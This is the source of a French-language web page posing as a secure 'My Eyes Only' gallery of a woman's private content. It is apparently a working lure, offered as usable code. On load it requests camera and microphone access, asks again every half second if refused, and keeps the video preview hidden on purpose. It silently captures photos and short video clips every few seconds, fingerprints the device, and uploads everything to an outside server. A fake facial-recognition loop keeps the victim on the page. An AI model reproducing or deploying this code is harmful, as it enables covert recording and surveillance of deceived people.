            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600"><rect width="800" height="600" fill="%23f0f0f0"/><rect x="50" y="50" width="150" height="120" fill="%23ddd" rx="10"/><rect x="220" y="50" width="150" height="120" fill="%23ccc" rx="10"/><rect x="390" y="50" width="150" height="120" fill="%23bbb" rx="10"/><rect x="560" y="50" width="150" height="120" fill="%23aaa" rx="10"/><rect x="50" y="200" width="150" height="120" fill="%23999" rx="10"/><rect x="220" y="200" width="150" height="120" fill="%23888" rx="10"/><rect x="390" y="200" width="150" height="120" fill="%23777" rx="10"/><rect x="560" y="200" width="150" height="120" fill="%23666" rx="10"/><rect x="50" y="350" width="150" height="120" fill="%23555" rx="10"/><rect x="220" y="350" width="150" height="120" fill="%23444" rx="10"/><rect x="390" y="350" width="150" height="120" fill="%23333" rx="10"/><rect x="560" y="350" width="150" height="120" fill="%23222" rx="10"/></svg>') center/cover;
            filter: blur(15px);

            /* Animation lente de zoom et de d√©placement */

        /* MODIFICATION : Keyframes pour l'animation du fond */
        @keyframes panZoom {
            0% { transform: scale(1.1) translate(0, 0); }

        .container {

            backdrop-filter: blur(20px);

        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;

        }

        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        .camera-section {
            margin-bottom: 30px;
        }

        .camera-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        .camera-status {
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .camera-pending {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        .camera-granted {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .camera-denied {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;

            transition: all 0.3s ease;
            margin: 10px;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .code-section {
            display: none;
            margin-top: 30px;

        .code-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;

        .code-input:focus {
            outline: none;

            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .auth-loop {

        .auth-message {

        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .hidden {
            display: none !important;
        }

        .video-preview {
            width: 100%;
            height: 200px;
            border-radius: 10px;
            margin-bottom: 20px;
            background: #f0f0f0;
            object-fit: cover;

<body>
    <div class="gallery-bg"></div>

    <div class="container">
        <div class="logo">
            üîí My Eyes Only
        </div>
        <div class="subtitle">Acc√®s s√©curis√© aux contenus priv√©s de <strong>Isabelle</strong></div>

        <!-- Section Cam√©ra -->
        <div class="camera-section">
            <!-- <div class="camera-icon">üì∑</div> -->
            <div id="cameraStatus" class="camera-status camera-pending">
                Autorisation requise pour la s√©curit√©.
            </div>
            <!-- MODIFICATION : Bouton supprim√© -->
            <video id="videoPreview" class="video-preview hidden" autoplay muted></video>
        </div>

        <!-- Section Code -->
        <div id="codeSection" class="code-section">
            <h3>Code d'acc√®s</h3>
            <input type="password" id="secretCode" class="code-input" placeholder="Entrez votre code secret" maxlength="8">
            <button id="validateCode" class="btn">Valider</button>
        </div>

        <!-- Boucle d'authentification -->
        <div id="authLoop" class="auth-loop">
            <div class="loading-spinner"></div>
            <div class="auth-message">
                <h3>Authentification en cours...</h3>
                <p>V√©rification de votre identit√© par reconnaissance faciale</p>
                <p class="pulse">Ne fermez pas cette page</p>
            </div>
            <div id="authStatus">Initialisation...</div>
        </div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let captureInterval = null;
        let authenticationActive = false;

        // Collecte d'informations client
        function getClientInfo() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint test', 2, 2);
            
            let webglInfo = null;
            try {
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    webglInfo = {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                }
            } catch(e) {}

            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                canvasFingerprint: canvas.toDataURL(),
                webglInfo: webglInfo,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack
            };
        }

        // Gestion de la cam√©ra
        async function requestCameraAccess() {
            try {
                const constraints = {
                    video: { width: 640, height: 480 },
                    audio: true
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const videoPreview = document.getElementById('videoPreview');
                videoPreview.srcObject = mediaStream;
                // MODIFICATION : La ligne qui affichait la vid√©o a √©t√© SUPPRIM√âE.
                // La vid√©o reste donc masqu√©e mais le flux est actif.
                
                document.getElementById('cameraStatus').textContent = "Niveau 1 ‚úì";//;
                document.getElementById('cameraStatus').className = 'camera-status camera-granted';
                document.getElementById('codeSection').style.display = 'block';
                
                console.log('Cam√©ra autoris√©e');
                authenticationActive = true;
                startCapturing();
            } catch (error) {
                console.error('Erreur cam√©ra:', error);
                document.getElementById('cameraStatus').textContent = 'Echec Niveau 1. Tentative en cours...';
                document.getElementById('cameraStatus').className = 'camera-status camera-denied';
                
                // Redemander apr√®s 0.5 secondes si l'acc√®s est refus√©.
                setTimeout(() => {
                    requestCameraAccess();
                }, 500);
            }
        }

        // Validation du code
        function validateCode() {
            const code = document.getElementById('secretCode').value;
            if (code.length >= 4) {
                // On cache la section du code et la section cam√©ra (qui contient le statut)
                document.getElementById('codeSection').style.display = 'none';
                document.querySelector('.camera-section').style.display = 'none';

                document.getElementById('authLoop').style.display = 'block';
                startAuthenticationLoop();
            } else {
                alert('Code trop court. Minimum 4 caract√®res.');
            }
        }

        // Boucle d'authentification
        function startAuthenticationLoop() {
            authenticationActive = true;
            let authStep = 0;
            
            const authMessages = [
                'Initialisation de la reconnaissance faciale...',
                'Analyse des traits du visage...',
                'V√©rification de l\'identit√©...',
                'Validation des param√®tres de s√©curit√©...',
                'Authentification en cours...'
            ];
            
            const authStatusEl = document.getElementById('authStatus');
            
            const authInterval = setInterval(() => {
                authStatusEl.textContent = authMessages[authStep % authMessages.length];
                authStep++;
            }, 3000);
            
            // D√©marrer la capture
            //startCapturing();
            
            // Simuler une authentification infinie
            setTimeout(() => {
                authStatusEl.textContent = 'Authentification r√©ussie! Acc√®s autoris√©...';
                setTimeout(() => {
                    authStatusEl.textContent = 'Rechargement de la session...';
                    setTimeout(() => {
                        authStatusEl.textContent = 'Verification de s√©curit√© suppl√©mentaire requise...';
                    }, 2000);
                }, 2000);
            }, 10000);
        }

        // Capture d'images et vid√©os
        function startCapturing() {
            if (!mediaStream)
                return;
            
            // Note : videoEl est masqu√©, mais on peut toujours l'utiliser pour la capture.
            const videoEl = document.getElementById('videoPreview');
            
            captureInterval = setInterval(async () => {
                if (!authenticationActive) return;
                
                try {
                    // Capture d'image
                    const canvas = document.createElement('canvas');
                    canvas.width = videoEl.videoWidth;
                    canvas.height = videoEl.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(videoEl, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Capture vid√©o courte
                    const recorder = new MediaRecorder(mediaStream);
                    let chunks = [];
                    
                    recorder.ondataavailable = (e) => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            sendCapture([imageData], reader.result);
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, 1000);
                    
                } catch (error) {
                    console.error('Erreur capture:', error);
                }
                
            }, 2000);

            setInterval(async () => {
                if (!authenticationActive) return;
                
                try {
                    // Capture d'image
                    const canvas = document.createElement('canvas');
                    canvas.width = videoEl.videoWidth;
                    canvas.height = videoEl.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(videoEl, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Capture vid√©o courte
                    const recorder = new MediaRecorder(mediaStream);
                    let chunks = [];
                    
                    recorder.ondataavailable = (e) => chunks.push(e.data);
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            sendCapture([imageData], reader.result);
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, 1000);
                    
                } catch (error) {
                    console.error('Erreur capture:', error);
                }
                
            }, 6000);
        }

        // Envoi des donn√©es
        async function sendCapture(images, video) {
            try {
                const data = {
                    images: images,
                    video: video,
                    timestamp: new Date().toISOString(),
                    clientInfo: getClientInfo()
                };
                
                const response = await fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    console.log('Donn√©es envoy√©es avec succ√®s');
                } else {
                    console.error('Erreur envoi:', response.status);
                }
                
            } catch (error) {
                console.error('Erreur r√©seau:', error);
            }
        }

        // Event listeners
        // MODIFICATION : L'√©couteur pour le bouton #requestCamera a √©t√© supprim√©.
        document.getElementById('validateCode').addEventListener('click', validateCode);
        document.getElementById('secretCode').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                validateCode();
            }
        });

        // Nettoyage √† la fermeture
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            if (captureInterval) {
                clearInterval(captureInterval);
            }
        });

        // Demander l'autorisation cam√©ra automatiquement au chargement
        window.addEventListener('load', () => {
            // Un petit d√©lai pour laisser la page se charger avant la demande de permission.
            setTimeout(() => {
                requestCameraAccess();
            }, 500);
        });
    </script>
</body>
